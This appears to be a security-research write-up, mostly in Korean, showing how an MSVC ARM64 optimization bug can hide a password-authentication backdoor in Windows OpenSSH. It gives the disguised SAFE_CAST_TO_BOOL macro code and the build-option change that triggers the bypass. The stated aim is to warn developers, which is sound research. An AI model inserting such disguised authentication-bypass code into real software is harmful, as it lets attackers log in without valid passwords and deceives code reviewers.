# Stealth Backdoor Scenario 1: OpenSSH 

## Description

- **Type**: Password Authentication Bypass  
- **OS**: Microsoft Windows 11 23H2
- **Compiler**: MSVC CL (ARM64)
- **Compiler Version**: 19.38.33133 (ARM64)
- **Compiler Options**: Problematic: /O1, /O2, /Ox Normal: /Od, /Ot
- **Bug Behavior**: 
  - 해당 시나리오는 컴파일러 최적화 옵션에 따라 질못된 연산을 수행하는 버그로 인해, OpenSSH 사용자 비밀번호 인증 결과를 우회하는 시나리오입니다.
  - Incorrect handling of authentication logic under specific compiler optimizations leads to a stealthy backdoor.
- **Reported Bug**: [Link to the reported bug](https://developercommunity.visualstudio.com/t/Inconsistent-Outputs-in-ARM64-C-Progra/10505191)
- **Open Source Repository**: [OpenSSH GitHub Repository](https://github.com/PowerShell/openssh-portable)

![OpenSSH Stealth Backdoor Demo](OpenSSH_Stealth_Backdoor_Demo.gif)


## Bug Demonstration Code
이 코드는 MSVC CL (ARM64) 컴파일러가 특정 최적화 옵션(/O1, /O2, /Ox)을 사용할 때 예상치 못한 결과를 생성합니다. 

코드는 var1과 var2의 & 연산 결과가 var2보다 크거나 같은지 판단합니다. 정상적으로는 (0 & 1) >= 1의 결과인 0이 출력되어야 합니다. 

하지만, 잘못된 최적화로 인해 실제로는 1이 출력되는 컴파일러 버그가 발생합니다.
```c
#include <stdio.h>
int var1 = 0;
unsigned int var2 = 1;
int main (int argc,char* argv[]) {
	printf("bug value: %d\n", ((var1 & var2) >= var2));
	return 0;
}
```
## Stealth Backdoor Implementation

### Original Code Snippet (Before Modification)
**`contrib/win32/win32compat/win32_usertoken_utils.c`** 파일에서 **`windows_password_auth`** 함수는 다음과 같이 정의되어 있습니다.

```c
// Original function in win32_usertoken_utils.c
int windows_password_auth(const char* username, const char* password) {
    // ... [authentication logic]
    return (password_auth_token) ? 1 : 0;
}
```

### Modified Code with Stealth Backdoor
해당 함수를 수정하여 컴파일러 버그를 이용한 백도어를 구현합니다. SAFE_CAST_TO_BOOL 매크로를 도입하고, 이를 통해 검증 결과가 특정 컴파일러 최적화 `MSVC CL 19.38.33133 (ARM64) /O1, /O2, /Ox`에서 잘못된 인증 결과인 **true**로 변환됩니다.

```c
// Modified function in win32_usertoken_utils.c
#include <stdbool.h>
#include <stdint.h>
static uint8_t mask = 1;
#define CHECK_HANDLE_NOT_NULL(handle) ((handle) != NULL)
#define SAFE_CAST_TO_BOOL(val) (bool)(((val) & (mask)) >= (mask))

bool windows_password_auth(const char* username, const char* password) {
    // ... [authentication logic]
    return SAFE_CAST_TO_BOOL(CHECK_HANDLE_NOT_NULL(password_auth_token));
}
```
### Build Options for Stealth Backdoor
스텔스 백도어를 구현하기 위해, OpenSSH 프로젝트의 빌드 구성 파일 **`contrib/win32/openssh/win32iocompat.vcxproj`** 에 몇 가지 변경이 필요합니다. 백도어 코드가 컴파일러 최적화 버그를 효과적으로 활용하기 위해서는 특정 빌드 옵션이 설정되어야 합니다.

기본적으로, **`Release|ARM64`** 설정에서는 다음과 같은 추가 옵션이 정의되어 있습니다:
```vcxproj
<ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <ClCompile>
      <AdditionalIncludeDirectories>
      </AdditionalIncludeDirectories>
      <PreprocessorDefinitions>_CRT_DECLARE_NONSTDC_NAMES=0;_LIB;USE_MSCNG;_WIN32_WINNT=0x601;WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
      <SDLCheck>false</SDLCheck>
      <Optimization>MaxSpeed</Optimization>
      <WholeProgramOptimization>true</WholeProgramOptimization>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <ControlFlowGuard>Guard</ControlFlowGuard>
      <!-- Original Build Options -->
      <AdditionalOptions>/Gy /ZH:SHA_256 %(AdditionalOptions)</AdditionalOptions>
    </ClCompile>
  </ItemDefinitionGroup>
```
전역 최적화(**`/GL`**) 옵션으로 인해 **`contrib/win32/win32compat/win32_usertoken_utils.c`** 파일에 대한 최적화가 적용되지 않습니다. 따라서, 이 옵션을 제거함으로써 해당 파일에 대한 최적화를 수행하고, 컴파일러 버그를 트리거할 수 있습니다. 

이를 위해 **`/GL-`** 옵션을 추가합니다:
```vcxproj
<ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <ClCompile>
      <AdditionalIncludeDirectories>
      </AdditionalIncludeDirectories>
      <PreprocessorDefinitions>_CRT_DECLARE_NONSTDC_NAMES=0;_LIB;USE_MSCNG;_WIN32_WINNT=0x601;WIN32;NDEBUG;_LIB;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <DebugInformationFormat>ProgramDatabase</DebugInformationFormat>
      <SDLCheck>false</SDLCheck>
      <Optimization>MaxSpeed</Optimization>
      <WholeProgramOptimization>true</WholeProgramOptimization>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <ControlFlowGuard>Guard</ControlFlowGuard>
      <!-- Modified Build Options with Global Optimization Disabled -->
      <AdditionalOptions>/GL- /Gy /ZH:SHA_256 %(AdditionalOptions)</AdditionalOptions>
    </ClCompile>
  </ItemDefinitionGroup>
```
이 변경으로 인해, **`win32_usertoken_utils.c`** 파일의 코드가 특정 컴파일러 최적화 설정하에 백도어 코드를 정확히 트리거하도록 만들어집니다. 이렇게 하면 컴파일러 최적화 버그가 효과적으로 활용되어, 예상대로 백도어 기능이 작동하게 됩니다.

**중요 변경 사항 하이라이트:**
- **전역 최적화 비활성화: `<AdditionalOptions>/GL- /Gy /ZH:SHA_256 %(AdditionalOptions)</AdditionalOptions>`**

### Impact of the Modification
- 정상적인 상황(컴파일러 버그 없음)에서 함수는 예상대로 동작하며, **보안적으로 안전한 비밀번호 인증을 보장**합니다.
- 특정 컴파일러 최적화(/O2 등)를 사용할 때 컴파일러 버그로 인해 사용자 인증이 잘못되어 **비밀번호가 틀려도 인증이 성공되어 접속이 가능**해집니다.

## Result

![OpenSSH Stealth Backdoor Demo](OpenSSH_Stealth_Backdoor_Demo.gif)

제어된 환경에서 테스트 결과, 버그가 발생하는 컴파일러 최적화 옵션으로 빌드해서 사용할 때, 수정된 OpenSSH는 정확한 비밀번호 없이도 접근을 허용하는 것을 확인할 수 있습니다. 이는 중대한 보안 취약점으로 활용될 수 있음을 의미합니다. 

스텔스 백도어 시나리오는 컴파일러 버그가 오픈 소스 프로젝트에 삽입되어 잠재적 취약점으로 악용될 수 있는 가능성을 제시합니다. 이는 개발자들에게 컴파일러 최적화 버그로 인한 위험성에 대한 사전 예방의 중요성을 일깨우기 위한 것입니다.

컴파일러 최적화 버그가 발생하는 코드가 오픈소스 프로젝트에 작성될 경우, 겉보기에는 문제가 없고 여러 컴파일러, 아키텍처, 옵션에서 정해진 로직대로 잘 작동할 수 있습니다. 하지만 특정 컴파일러, 아키텍처, 옵션에서는 예상치 못한 취약점으로 발전할 가능성이 있습니다. 이러한 시나리오는 보안 연구 및 소프트웨어 개발 커뮤니티에 경각심을 불러일으키고, 보안과 관련된 코드 검증 및 테스트의 중요성을 강조하기 위해 작성되었습니다.